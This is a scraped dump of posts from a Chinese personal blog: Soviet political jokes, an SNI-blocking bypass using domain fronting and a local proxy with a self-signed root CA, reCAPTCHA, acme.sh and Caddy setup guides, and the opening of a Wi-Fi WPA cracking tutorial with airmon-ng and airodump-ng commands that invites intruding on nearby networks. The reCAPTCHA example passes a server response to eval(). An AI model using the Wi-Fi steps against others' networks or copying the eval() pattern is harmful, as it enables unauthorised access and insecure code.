一位克格勃官员面授打字员给另一克格勃官员写封信。\n“信的开头怎样写？”打字员问，“是尊敬的先生吗？”\n“尊敬的？可他是一个十足的滑头和屠夫，不能这样称呼。要么就称亲爱的同行吧！”\n300: # 一个老妇人等了两个小时才挤上汽车。当她终于上车之后，她擦了擦她的额头，说：“终于上来了，感谢上帝！”\n司机说：“大娘，你不能这么说。你必须说‘感谢斯大林同志’。”\n“抱歉，同志。”老夫人答道，“我就是个落后的老女人。我会从现在开始按你说的说的。”\n过了一会儿，她又问道：“抱歉，同志，我很老很笨。如果不让说上帝，斯大林死了，那我该怎么说？”\n“好吧，到那时候你就可以说‘感谢上帝’了！”\n301: # 勃列日涅夫给尼克松打电话，说他昨天晚上做了个梦：一面红旗飘扬在白宫上空。\n第二天尼克松给勃列日涅夫讲他的梦： “列昂尼德，我梦到一面红旗飘扬在克里姆林宫上空！”\n“不过现在就是这样啊？”\n“不见得……我梦里那面红旗上貌似写着中文……”\n302: # 问：想象斯大林、政治局委员和他们的全体跟班都在涅瓦河的一艘蒸汽船上。突然船进水，迅速沉没，谁会得救？\n答：全体苏联人民。\n303: # 问：可以批判希特勒吗？\n答：可以，就像你批判斯大林的方法一样。你把把自己锁在屋里，蒙上两层，最好三层被子，在脸上蒙上一个，最好两个枕头，然后就可以畅所欲言了。记住，时间要严格限定在 5 分钟以内。\n304: # 问：什么是苏联制度下的各民族团结？\n答：就是亚美尼亚人、俄罗斯人、乌克兰人等苏联一切民族如兄弟一般团结起来，共同胖揍阿塞拜疆人。\n305: # 东德人对西德人说：“我们是一个民族！”\n西德人回应说：“我们也是。”\n306: # 医生在精神病院巡视。\n“这里有一个格外严重的病例，”医生指着一个病人叹息道，“他居然在昂内克废话的时候没有关掉收音机！”\n307: # 民主德国的监狱里，一个犯人向另一个解释他入狱的原因。 “都是因为我太懒了。”\n“消极怠工？”\n“不是，我和一个同事讨论了政治问题，我以为明天早上到斯塔西去告发他还来得及，谁想他比我先行一步。”\n308: # 一个民主德国的居民被掐掉了电话线，他跑去申诉并询问原因，有关部门告诉他：“因为您诬蔑了国家安全部。”\n“我怎么诬蔑的？”\n“我们有记录：您曾多次在电话中声称，安全部窃听了您的通话。”\n309: # 白宫的一个灯泡烧坏了。尼克松按了一下按钮， 一名工作人员走进来，换了一个灯泡。尼克松给了他 5 美元。克里姆林宫的一个灯泡坏了。勃列日涅夫的侍卫叫来一名工作人员，那名工作人员换了一个灯泡。勃列日涅夫给了侍卫一枚奖章，也给了那名工作人员一枚奖章。勃列日涅夫看了看，觉得新灯泡不错，又给了他自己一枚奖章。\n310: # 一个美国人和苏联人闲聊\u0026hellip;..美国人说: “我们的国家是如此自由，人们想干什么就干什么。比如我最近甚至在华盛顿的白宫前撒尿，而谁都不管。”\n俄国人说:“ 这算什么，我还在红场上拉过屎呢!”\n美国人解释: “好吧，我承认，其实为保险起见，我观察左右没有人后，才\u0026hellip;。”\n俄国人也承认: “其实我拉屎时，没解开裤子\u0026hellip;”\n311: # 赫鲁晓夫赠给肯尼迪一辆新轿车,但是没有方向盘。\n肯尼迪发给赫鲁晓夫一封电报:“请把方向盘寄来,否则我无法启动这辆车。”\n赫鲁晓夫发电报答复说:“你只要坐上去,然后闭上眼睛就行了。我这里有遥控器。”\n312: # 戈尔巴乔夫时期。一男子来到酒馆\u0026hellip;..\n男子：“来瓶儿伏特加！”\n侍者：“10 卢布。”\n男子：“上次来还是 5 卢布，怎么……？”\n侍者：“伏特加 5 卢布，另外 5 卢布是党的革命基金。”\n男人不情愿地掏出 10 卢布递给侍者。侍者又找了他 5 卢布。\n男子：“怎么又找了 5 卢布？”侍者：“酒都卖光了。”\n313: # 昨天莫斯科发生了地震，学者们在格外震惊之余对此表示深切的怀疑，因为莫斯科不处于任何一条地震带上。\n最后经过他们的研究，并非是地震，而是勃列日涅夫同志佩有勋章的衣服掉在了地上。\n314: # 苏联一位政委到乡下视察，路上碰见一农夫，便问他今年的收成如何。\n农夫回答说：“今年土豆收成不错，快堆到上帝脚边了。”\n政委很高兴却义正言辞：“同志，我们是社会主义国家，不信上帝也不存在上帝。”\n农夫说：“那正好，我们也没有土豆。”\n313: # 赫鲁晓夫把自己新出品的香肠送到国外去分析,不久就得到了结果:“赫鲁晓夫先生,在你的粪便里没有任何寄生虫。”\n314: # 问：如何停止正在前进的阿尔巴尼亚坦克？\n答：打死正在推坦克的士兵。\n尾声 # 问：你相信随着时间的推移，政治笑话正被重新认识吗？\n答：当然。过去一个笑话判 15 年，现在只判 3 年。\n","date":"2020年2月24日","externalUrl":null,"permalink":"/posts/soviet-jokes/","section":"","summary":"\u003cp\u003e苏联政治笑话系列是我迄今为止看到的含金量最高，最具幽默感的笑话。经过收集，已知中文网上存在着的苏联在政治笑话大概有 500 则左右。这些笑话大概有两个来源，一是苏联及其他社会主义国家（笑话中较常出现的是民主德国、古巴）人民表达自己愤怒的一些地下文学形式；二是资本主义国家在冷战期间进行意识形态作战采取的一种方式，其中 CIA（美国中央情报局）和美国驻苏联记者应该功不可没。\u003c/p\u003e","title":"苏联政治笑话","type":"posts"},{"content":"","date":"2020年2月21日","externalUrl":null,"permalink":"/tags/https/","section":"Tags","summary":"","title":"HTTPS","type":"tags"},{"content":"","date":"2020年2月21日","externalUrl":null,"permalink":"/tags/sni/","section":"Tags","summary":"","title":"SNI","type":"tags"},{"content":"","date":"2020年2月21日","externalUrl":null,"permalink":"/tags/tls/","section":"Tags","summary":"","title":"TLS","type":"tags"},{"content":" SNI 阻断技术简单介绍 # TLS 是一个伟大的技术，它确保了网络传输的内容不被中间人篡改。现在越来越多的网站正在使用 HTTPS（即 HTTP over TLS）来保护网页内容。与此同时，TLS 设计中的一个缺陷，却使得阻断 TLS 连接变得可控。\n在建立新的 TLS 连接时，客户端（如浏览器）发出的第一个握手包（称为 Client Hello）中，包含了想要访问的域名信息（称为 SNI，Server Name Indication）。某些服务器（比如 CDN）会同时支持多个域名，在加密传输之前，它需要知道客户端访问的是哪个域名。于是 SNI 必须以明文的方式传输。并且由于浏览器并不知道服务器是否需要 SNI，浏览器会对所有的 TLS 握手都加入 SNI。\n于是，大家都懂的。根据黑名单，某些防火墙对于 TLS 连接可以进行精确地阻断。\n目前 Mozilla 和 CloudFlare 主导了一项对 SNI 的改进方案，称为 Encrypted SNI (ESNI)。这个提案还在早期的讨论状态中，目测还需要两年时间才可以定稿和推广。现阶段只有 Firefox Nightly（客户端），以及 CloudFlare 和 Wikipedia（网站）支持初代的 ESNI。\n在 ESNI 正式推广之前，我们还需要其它的技术来避开对于 TLS 连接的探测。\n目前我们还没有发现通用的解决方案。有一个较为通用的，但部署起来略麻烦的方案称为 Domain Fronting (域前置，又叫域名幌子)。它的原理简单来说是这样的：部分服务器允许 TLS 连接说自己需要域名 A，但之后的 HTTP 协议说自己需要域名 B。或者服务器压根就不看 SNI 的信息。在这种情况下，对于一个黑名单的域名， 我们在建立 TLS 的时候，可以选用一个不在黑名单的域名，绕过对 TLS 连接的监测。\n当然，它的缺点是，依赖于服务器行为。也就是说，每个不同的站点，可能都需要不同的策略（域名）。\n举两个例子：\nP 站的服务器实际上是不看 SNI 的。在建立 TLS 连接的时候，即使不携带 SNI，也可以正常进行 HTTPS 访问。 zh.wikipedia.org 是一个黑名单域名，但同站点的 www.wikipedia.org 就不是。我们在建立 TLS 连接时，使用 SNI = www.wikipedia.org ，之后的 HTTP 请求依然可以正常连到 zh.wikipedia.org。 顺便说一句，Domain Fronting 实际上不是一个合理的用法，网站完全可以拒绝这类连接，比如 Google 和 Amazon 就主动在自己的所有服务中拒绝这项技术。即使这样，Domain Fronting 依然是在 ESNI 之前最好的绕过技术。\n下面我们将使用一个工具来解决 SNI 阻断问题\n过程 # 在看此教程之前，请确保你已经安装了OpenSSL，具体安装过程不再详述，可以在 CMD/Powershell/bash/Terminal 中输入openssl,如果出现OpenSSL\u0026gt;字样，说明已经安装\n创建自签名 CA 证书 # 使用 CMD/Powershell/bash/Terminal 等命令行工具打开任意文件夹，依次输入下面的命令 （其中的 openssl.cnf 可以在 openssl 的安装处找到，如果没有可以下载这个，放在命令行工具打开的文件夹下)\n# 生成根证书私钥(key文件) openssl genrsa -out ca.key 2048 # 生成根证书签发申请文件(csr文件，申请过程可一路回车) openssl req -new -key ca.key -out ca.csr -config ./openssl.cnf # 自签发根证书(crt文件) openssl x509 -req -days 3650 -in ca.csr -signkey ca.key -out ca.crt # 生成pem格式证书 cat ca.crt ca.key \u0026gt; ca.pem Windows 下可以直接打开 ca.crt 文件并安装证书，Linux 等系统请自行根据版本进行安装。还可以通过浏览器来进行安装（系统直接安装和浏览器安装二选一），这里以 Chromium 系浏览器为例。\n在设置中搜索证书： 点击管理证书后面的按钮，并找到“受信任的根证书颁发机构”：\n导入刚才的 ca.crt 即可，之后 Windows 系统需要重启才能使证书生效，Linux 请根据实际情况进行操作。\n通过工具解决 SNI 阻断 # 下载地址 https://github.com/bypass-GFW-SNI/main/releases\n或使用这个地址 https://www.lanzous.com/b0bec39pa 密码:hwmy\n根据你的系统进行下载，Linux 系统需要给文件 777 权限\n同时下载这个文件 https://www.lanzous.com/i9jthcb\n将下载的文件放入刚才生成证书的文件夹，使用命命令行工具执行下面的命令\n# Windows .\\bypass-v1.2-windows-amd64.exe -c .\\ca.pem -k .\\ca.key -l .\\domain.conf # Linux .\\bypass-v1.2-linux-amd64 -c .\\ca.pem -k .\\ca.key -l .\\domain.conf 如果提示\u0026quot;listen tcp [::1]:443: bind: An attempt was made to access a socket in a way forbidden by its access permissions.\u0026quot;则是 443 端口被占用，请自行搜索解决\n最后设置 # 以下两个方法二选一，都可以达到目的\n将本机的 DNS 设置为 127.0.0.1 设置方法请自行搜索解决 设置 hosts 可以下载 这个 文件，用记事本打开，搜索相关网站（如 pixiv 等），将前面的 IP 改为 127.0.0.1，效果如下： 保存，然后 Windows 需要替换C:/WINDOWS/system32/drivers/etc/hosts这个文件为刚刚改动的文件，Linux 需要替换/etc/hosts这个文件为刚刚改动的文件，之后 Windows 可以在命令行工具中执行ipconfig /flushdns刷新 dns 缓存，Linux 需要执行/etc/init.d/networking restart重启网络，之后可以通过浏览器连接某些网站（如 p 站）来测试效果。\n","date":"2020年2月21日","externalUrl":null,"permalink":"/posts/remove-sni-block/","section":"","summary":"\u003ch2 class=\"relative group\"\u003eSNI 阻断技术简单介绍 \n    \u003cdiv id=\"sni-%E9%98%BB%E6%96%AD%E6%8A%80%E6%9C%AF%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#sni-%E9%98%BB%E6%96%AD%E6%8A%80%E6%9C%AF%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eTLS 是一个伟大的技术，它确保了网络传输的内容不被中间人篡改。现在越来越多的网站正在使用 HTTPS（即 HTTP over TLS）来保护网页内容。与此同时，TLS 设计中的一个缺陷，却使得阻断 TLS 连接变得可控。\u003c/p\u003e","title":"使用简单方法解决SNI阻断问题","type":"posts"},{"content":"","date":"2020年2月13日","externalUrl":null,"permalink":"/tags/google/","section":"Tags","summary":"","title":"Google","type":"tags"},{"content":"","date":"2020年2月13日","externalUrl":null,"permalink":"/tags/recaptcha/","section":"Tags","summary":"","title":"ReCAPTCHA","type":"tags"},{"content":"我看版本 2 的有人说了，我简单的说一下版本 3 的使用和集成\n国内使用 reCAPTCHA 只需要将 www.google.com 替换成 www.recaptcha.net，即可在国内使用 recaptcha 的服务。 如 https://www.google.com/recaptcha/api.js 替换成 https://www.recaptcha.net/recaptcha/api.js，https://www.google.com/recaptcha/api/siteverify 替换成 https://www.recaptcha.net/recaptcha/api/siteverify。\n浏览器界面请使用以下方法使用\n\u0026lt;script src=\u0026#34;https://www.recaptcha.net/recaptcha/api.js?render=客户端代码\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; //验证reCAPTCHA是否载入 grecaptcha.ready(function () { console.log(\u0026#34;reCAPTCHA载入成功\u0026#34;) }); //生成特征验证码 grecaptcha.execute(\u0026#39;客户端代码\u0026#39;, {action: \u0026#39;homepage\u0026#39;}).then(function(token) { }); \u0026lt;/script\u0026gt; 这里给一个比较完整的例子，以 JavaScript 和 python(flask)为例\n客户端代码 JavaScript # \u0026lt;script src=\u0026#34;https://www.recaptcha.net/recaptcha/api.js?render=客户端代码\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;//cdn.jsdelivr.net/combine/gh/jquery/jquery/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; grecaptcha.ready(function () { console.log(\u0026#34;reCAPTCHA载入成功\u0026#34;) }); $(\u0026#39;#submit\u0026#39;).click(function () { var d = {}; var t = $(\u0026#39;form\u0026#39;).serializeArray(); $.each(t, function () { d[this.name] = this.value; }); console.log(d) grecaptcha.execute(\u0026#39;客户端代码\u0026#39;, { action: \u0026#39;homepage\u0026#39; }).then(function (token) { d[\u0026#34;recaptcha\u0026#34;] = token $.ajax({ type: \u0026#39;post\u0026#39;, data: d, url: \u0026#39;verify\u0026#39;, cache: false, dataType: \u0026#39;text\u0026#39;, success: function (data) { if (data == \u0026#34;1\u0026#34;) { $(\u0026#34;#ok\u0026#34;).text(\u0026#34;通过验证，您不是机器人\u0026#34;) } else { $(\u0026#34;#ok\u0026#34;).text(\u0026#34;未通过验证，请重新测试\u0026#34;) } console.log(data) } }) }) }); \u0026lt;/script\u0026gt; 服务器端代码 Python(Flask) # @app.route(\u0026#39;/verify\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def verify(): if request.method == \u0026#39;POST\u0026#39;: verification = request.form[\u0026#39;recaptcha\u0026#39;] datas = { \u0026#39;secret\u0026#39;: \u0026#34;服务器端代码\u0026#34;, \u0026#39;response\u0026#39;: verification } k = requests.post( \u0026#34;https://recaptcha.net/recaptcha/api/siteverify\u0026#34;, data=datas) print(k.text) kk = eval(k.text.replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;).replace( \u0026#39;true\u0026#39;, \u0026#34;1\u0026#34;).replace(\u0026#39;false\u0026#39;, \u0026#34;2\u0026#34;)) if kk[\u0026#34;success\u0026#34;] == 1: return \u0026#34;1\u0026#34; else: return \u0026#34;0\u0026#34; 同时可使用下面的命令对右下角的标志进行隐藏\n\u0026lt;style\u0026gt; .grecaptcha-badge { visibility: hidden !important; } \u0026lt;/style\u0026gt; \u0026lt;!-- 但是谷歌强烈建议在网站上保留下面的标识 --\u0026gt; \u0026lt;small \u0026gt;This site is protected by reCAPTCHA and the Google \u0026lt;a href=\u0026#34;https://policies.google.com/privacy\u0026#34;\u0026gt;Privacy Policy\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;https://policies.google.com/terms\u0026#34;\u0026gt;Terms of Service\u0026lt;/a\u0026gt; apply. \u0026lt;/small\u0026gt; \u0026lt;!-- 自行翻译的中文版 --\u0026gt; \u0026lt;small \u0026gt;本网站受RECAPTCHA和谷歌\u0026lt;a href=\u0026#34;https://policies.google.com/privacy\u0026#34; \u0026gt;隐私政策\u0026lt;/a \u0026gt;及\u0026lt;a href=\u0026#34;https://policies.google.com/terms\u0026#34;\u0026gt;服务条款\u0026lt;/a\u0026gt;的保护。 \u0026lt;/small\u0026gt; 完整例子下载地址 # https://www.lanzous.com/i9doidc\n","date":"2020年2月13日","externalUrl":null,"permalink":"/posts/use-recaptcha-in-china/","section":"","summary":"\u003cp\u003e我看版本 2 的有人说了，我简单的说一下版本 3 的使用和集成\u003c/p\u003e\n\u003cp\u003e国内使用 reCAPTCHA 只需要将 \u003ca href=\"https://www.google.com\" target=\"_blank\"\u003ewww.google.com\u003c/a\u003e 替换成 \u003ca href=\"https://www.recaptcha.net\" target=\"_blank\"\u003ewww.recaptcha.net\u003c/a\u003e，即可在国内使用 recaptcha 的服务。\n如 \u003ca href=\"https://www.google.com/recaptcha/api.js\" target=\"_blank\"\u003ehttps://www.google.com/recaptcha/api.js\u003c/a\u003e 替换成 \u003ca href=\"https://www.recaptcha.net/recaptcha/api.js\" target=\"_blank\"\u003ehttps://www.recaptcha.net/recaptcha/api.js\u003c/a\u003e，https://www.google.com/recaptcha/api/siteverify 替换成 \u003ca href=\"https://www.recaptcha.net/recaptcha/api/siteverify\" target=\"_blank\"\u003ehttps://www.recaptcha.net/recaptcha/api/siteverify\u003c/a\u003e。\u003c/p\u003e","title":"在中国国内使用Google reCAPTCHA 2/3 验证码的方法","type":"posts"},{"content":"","date":"2020年2月13日","externalUrl":null,"permalink":"/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/","section":"Tags","summary":"","title":"验证码","type":"tags"},{"content":" 查看你在 B 站注册的时间 # 请按步骤操作\n登录你的 B 站账号（如果你在客户端里打开那默认就是已经登录了）\n点击下面的网页 # https://member.bilibili.com/x2/creative/h5/calendar/event?ts=0\n复制中间部分（或者全部复制,电脑端建议全部复制）\n手机端长按vip 或 identification 就能选中那一大块\n如果你是手机端，请使用回退键（或者全面屏的手势），不要点击上面的 ×，这样你要重新再点进来\n粘贴到下面的输入框中 # 请输入复制的代码 你的注册时间是 原理 # 刚才取出的数据中，其中有一段是\u0026quot;jointime\u0026quot;:******，后面跟的就是你的注册时间，只不过这个是时间戳，我原来的视频里讲到过。\n时间戳是指格林威治时间 1970 年 01 月 01 日 00 时 00 分 00 秒(北京时间 1970 年 01 月 01 日 08 时 00 分 00 秒)起至现在的总毫秒数。（现在取出来的是秒时间戳）经过换算就能得出你具体的注册时间\n声明 # 本网站为静态网站，不会记录你的任何信息，请放心使用\n","date":"2020年2月12日","externalUrl":null,"permalink":"/posts/view-regtime-of-bilibili/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e查看你在 B 站注册的时间 \n    \u003cdiv id=\"%E6%9F%A5%E7%9C%8B%E4%BD%A0%E5%9C%A8-b-%E7%AB%99%E6%B3%A8%E5%86%8C%E7%9A%84%E6%97%B6%E9%97%B4\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E6%9F%A5%E7%9C%8B%E4%BD%A0%E5%9C%A8-b-%E7%AB%99%E6%B3%A8%E5%86%8C%E7%9A%84%E6%97%B6%E9%97%B4\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003e请按步骤操作\u003c/strong\u003e\u003c/p\u003e","title":"[已过时] 查看你在B站注册的时间","type":"posts"},{"content":"","date":"2020年2月12日","externalUrl":null,"permalink":"/tags/%E6%B3%A8%E5%86%8C%E6%97%B6%E9%97%B4/","section":"Tags","summary":"","title":"注册时间","type":"tags"},{"content":"","date":"2020年2月4日","externalUrl":null,"permalink":"/tags/ssl/","section":"Tags","summary":"","title":"SSL","type":"tags"},{"content":" acme.sh # acme.sh是一个实现了 acme 协议的脚本，可以从 Let\u0026rsquo;s Encrypt 生成免费的 SSL 证书\n本文只给出配合解析商 API 申请泛域名证书的过程教程，acme.sh 还有很多很强大的功能例如配合 Nginx 或者 Apache 等自动申请证书，请自行查看 github 项目 wiki 发掘\nhttps://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E\n部署 acme.sh # curl https://get.acme.sh | sh # 或者 wget -O- https://get.acme.sh | sh 获取 Cloudflare 的 API 信息 # acme.sh 目前支持 cloudflare, dnspod, cloudxns, godaddy 以及 ovh 等数十种解析商的 API，可以自动添加 TXT 记录来验证，不需要人工操作，十分便捷\n详细可以看 https://github.com/Neilpang/acme.sh/blob/master/dnsapi/README.md\n这里以 Cloudflare 为例，CloudFlare Domain API 提供了两种自动颁发证书的方法。\n使用全局 API 密钥 # 首先，您需要登录到 CloudFlare 帐户以获取全局 API 密钥。\n然后根据你的 API 密钥来填写下面的命令，并在服务器里执行\nexport CF_Key=\u0026#34;sdfsdfsdfljlbjkljlkjsdfoiwje\u0026#34; export CF_Email=\u0026#34;xxxx@sss.com\u0026#34; 其中CF_Key是你的 Global API Key，CF_Email是你注册 cloudflare 的邮箱。\n使用新的 cloudflare API 令牌 # export CF_Token=\u0026#34;sdfsdfsdfljlbjkljlkjsdfoiwje\u0026#34; export CF_Account_ID=\u0026#34;xxxxxxxxxxxxx\u0026#34; 没试过，只会第一种\n其他解析商的环境变量名是不一样的，详情去这里看 https://github.com/Neilpang/acme.sh/blob/master/dnsapi/README.md\n这个临时环境变量只需配置这一次，当成功申请证书后，API 信息会被自动保存在~/.acme.sh/account.conf，下次你使用 acme.sh 的时候会被自动使用\n开始申请证书 # 接下来正式开始申请泛域名证书，将 example.com 换成你自己的域名\n~/.acme.sh/acme.sh --issue --dns dns_cf -d example.com -d \u0026#39;*.example.com\u0026#39; \u0026ndash;dns dns_cx 参数表示使用 CloudXNS 的 API，如果是其他解析商，同样的，从上面那个链接可以看到对应参数\n然后静静等待即可\n得到证书 # 申请完成后屏显会输出证书路径\n证书是fullchain.cer 密匙是example.com.key\n由于证书默认（在你没安装宝塔等同样调用 acme 签发证书的面板时）会在 acme 的内部目录~/.acme.sh/中生成，不建议直接使用该路径填写至 nginx 等配置中，而是使用--installcert命令，具体请参考 ↓\nhttps://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E#3-copy%E5%AE%89%E8%A3%85-%E8%AF%81%E4%B9%A6\n关于证书续期 # Let\u0026rsquo;s Encrypt 证书的有效期为三个月，acme.sh会每隔 60 天自动帮你续期，无需你进行任何干预\n如果你想强制续期或者取消自动续期可以看 https://github.com/Neilpang/acme.sh#11-how-to-renew-the-certs\n","date":"2020年2月4日","externalUrl":null,"permalink":"/posts/acme-le-wc/","section":"","summary":"acme.sh是一个实现了acme协议的脚本，可以从Let\u0026rsquo;s Encrypt生成免费的SSL证书","title":"使用 acme.sh 申请 Let's Encrypt 泛域名SSL证书详细教程","type":"posts"},{"content":" [!WARNING] 此教程已过时，不再适用，仅供参考\n**说明：**这几天一直在看逗比根据地，发现Caddy很是强大，是一个极简的HTTP服务器，支持HTTP/2静态网页服务器，安装也很快，在很多方面都可以不用安装时间很长的lnmp，lamp环境了，配置文件也很简单，同时还有一些有趣的扩展，可以非常方便的搭建一个HTTP服务器。\n安装 # 系统要求：CentOS 6+/Debian 6+/Ubuntu 14.04 +。推荐Debian 7 x64。\n本脚本只是一个一键安装+运行控制的脚本，没有其他管理虚拟主机等功能。\n执行下面的代码安装Caddy，如果想要安装其他扩展可以把名字加到命令后面（bash caddy_install.sh install xxx,xxx,xxx，扩展列表点击查看）。\nwget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/caddy_install.sh \u0026amp;\u0026amp; chmod +x caddy_install.sh \u0026amp;\u0026amp; bash caddy_install.sh #备用地址 wget -N --no-check-certificate https://gwliang.com/caddy_install.sh \u0026amp;\u0026amp; chmod +x caddy_install.sh \u0026amp;\u0026amp; bash caddy_install.sh 使用说明 # 启动：/etc/init.d/caddy start 停止：/etc/init.d/caddy stop 重启：/etc/init.d/caddy restart 查看状态：/etc/init.d/caddy status 查看Caddy启动日志：tail -f /tmp/caddy.log 安装目录：/usr/local/caddy Caddy配置文件位置：/usr/local/caddy/Caddyfile Caddy自动申请SSL证书位置：/.caddy/acme/acme-v01.api.letsencrypt.org/sites/xxx.xxx(域名)/ 升级 Caddy 或者更新扩展 # 只需要重新执行你当初安装时候用的命令即可，会覆盖安装最新的Caddy+扩展。\n卸载 Caddy # 卸载不会删除虚拟主机的内容，只会删除Caddy自身和配置文件。\nwget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/caddy_install.sh \u0026amp;\u0026amp; bash caddy_install.sh uninstall #备用地址 wget -N --no-check-certificate https://gwliang.com/caddy_install.sh \u0026amp;\u0026amp; bash caddy_install.sh uninstall 网站配置文件 # 配置文件为Caddyfile，列举几种caddy的conf的写法\n1、本地访问 80\n:80 2、单网站访问\nexample.com root /usr/local/caddy/www //更多模块 2、多网站\nexample.com { gzip root /usr/local/caddy/www //更多模块 } 常用基本组成模块，均写入到conf站点配置中。\n#log日志 log /usr/local/caddy/www/example.log #目录访问 browse #gzip压缩 gzip #自主ssl证书 tls /path/ssl/example.com.crt /path/ssl/example.com.key #访问口令认证（用户emiria，密码abc123） basicauth / emiria abc123 #跳转功能 redir http://example.com{url} #自定义错误页面 errors { 404 404.html 500 /usr/local/caddy/www/500.html } 例如，通过IP即80端口访问目录：\n:80 { root /usr/local/caddy/www gzip browse } 也可以直接执行命令写入，以下是一个命令，直接复制粘贴即可。\necho \u0026#34;:80 { root /usr/local/caddy/www gzip browse }\u0026#34; \u0026gt; /usr/local/caddy/Caddyfile 更多配置参考：https://caddyserver.com/tutorial/caddyfile 设置文档参考：https://caddyserver.com/docs\n常见问题 # 1、Caddy 启动失败，打开 ip 访问地址显示的是 It works ! 一些系统会自带apache2，而apache2会占用80端口，导致Caddy无法绑定端口，所以只要关掉就好了。\nnetstat -lntp # 我们可以通过这个命令查看是不是被其他软件占用了80端口。 不过apache2会默认开机自启动，如果不需要可以关闭自启动或者卸载apache2。\n停止Apache2\n# CentOS系统 /etc/init.d/httpd stop # Debian/Ubuntu系统 /etc/init.d/apache2 stop # 尝试使用上面代码关闭，如果没效果或者提示什么错误无法关闭，那就用下面这个强行关闭进程。 kill -9 $(ps -ef|grep \u0026#34;apache2\u0026#34;|grep -v \u0026#34;grep\u0026#34;|awk \u0026#39;{print $2}\u0026#39;) 取消开机自启动\n# CentOS 系统 chkconfig --del httpd # Debian/Ubuntu 系统 update-rc.d -f apache2 remove 卸载Apache2\n# CentOS 系统 yum remove httpd # Debian/Ubuntu 系统 apt-get remove --purge apache2 关闭Apache2后，就可以尝试启动Caddy，并试试能不能打开网页。\n/etc/init.d/caddy start 2、启动 Caddy 后，无法访问 这个可能是防火墙的问题，开放防火墙端口即可。\niptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 端口 -j ACCEPT iptables -I INPUT -m state --state NEW -m udp -p udp --dport 端口 -j ACCEPT # 删除防火墙规则，内容一样把 -I 换成 -D 就行了： iptables -D INPUT -m state --state NEW -m tcp -p tcp --dport 端口 -j ACCEPT iptables -D INPUT -m state --state NEW -m udp -p udp --dport 端口 -j ACCEPT 3、SSL 证书签发失败 比如报错acme: error: 400 :: urn:ietf:params:acme:error:connection :: Error getting validation data, url:，检查下防火墙端口，需要开启80和443端口，然后重启即可。\n转载声明 # 原文链接：https://www.moerats.com/archives/404/\n","date":"2020年1月27日","externalUrl":null,"permalink":"/posts/caddy-install/","section":"","summary":"【已过时】 使用Caddy搭建一个极简的HTTP Server","title":"【已过时】 一个极简的HTTP Server： Caddy一键安装脚本，带网站配置教程","type":"posts"},{"content":"","date":"2020年1月24日","externalUrl":null,"permalink":"/tags/wi-fi/","section":"Tags","summary":"","title":"Wi-Fi","type":"tags"},{"content":" Wi-Fi 破解 # 利用 Airodump-ng 以及 Aircrack-ng / Hashcat 破解 WPA/WPA2 WI-FI 路由器。\n这是个简洁的教程，一步一步的描述了如何破解使用弱密码保护的 WI-FI 网络。它不会极尽其详，但是足够你用来测试自己的网络安全或者入侵附近网络。下面列出的攻击完全是被动式的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。不过一个可选的 deauthentication 攻击可以用于加速侦查过程，在文档末尾有描述。\n如果你熟悉这个过程，你可以跳过这段描述直接跳到底部使用的命令列表。更多种建议以及可行的方法，参考附录 A。\n声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。\n入门 # 这个教程假定你：\n可以流畅使用命令行 使用一个基于 debian 的 linux 发行版本，最好是 Kali linux 安装 Aircrack-ng sudo apt-get install aircrack-ng 拥有一块支持监测模式的无线网卡（对于支持的设备列表，参考这里) 破解一个 WI-FI 网络 # 监测模式 (Monitor Mode) # 让我们通过下面的命令可以列出支持监测模式的无线接口开始：\nairmon-ng 如果你没有看到有接口列出，意味着你的无线网卡就不支持监测模式 😞\n我们将假设你的无线接口名称是 wlan0，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监测模式：\nairmon-ng start wlan0 运行 iwconfig。你现在应该能够看到列出一个新的监测模式接口（比如 mon0 或者 wlan0mon）。\n找到你的目标 # 使用你的监测接口开始监听附近的 802.11 Beacon 帧广播：\nairodump-ng mon0 你应该可以看到类似于下面的输出。\nCH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 14:91:82:F7:52:EB -66 205 26 0 1 54e OPN belkin.2e8.guests 14:91:82:F7:52:E8 -64 212 56 0 1 54e WPA2 CCMP PSK belkin.2e8 14:22:DB:1A:DB:64 -81 44 7 0 1 54 WPA2 CCMP \u0026lt;length: 0\u0026gt; 14:22:DB:1A:DB:66 -83 48 0 0 1 54e. WPA2 CCMP PSK steveserro 9C:5C:8E:C9:AB:C0 -81 19 0 0 3 54e WPA2 CCMP PSK hackme 